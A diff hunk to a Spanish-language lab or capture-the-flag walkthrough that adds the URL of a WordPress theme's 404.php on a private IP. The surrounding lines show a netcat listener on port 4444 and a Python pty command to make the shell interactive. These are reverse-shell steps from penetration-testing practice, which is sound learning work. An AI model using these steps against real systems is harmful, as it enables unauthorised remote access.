@@ -94,6 +94,8 @@ Antes de ejecutar la url pondremos el comando para abrir el puerto puesto en la 
 
 ```rlwrap nc -nvlp 4444```
 
+La url es esta: ```http://192.168.221.5/DiagonAlley/wp-content/themes/amphibious/404.php```
+
 Posteriormente a esto, haremos que la shell sea interactiva con este comando:
 
 ```python3 -c 'import pty; pty.spawn("/bin/bash")'```
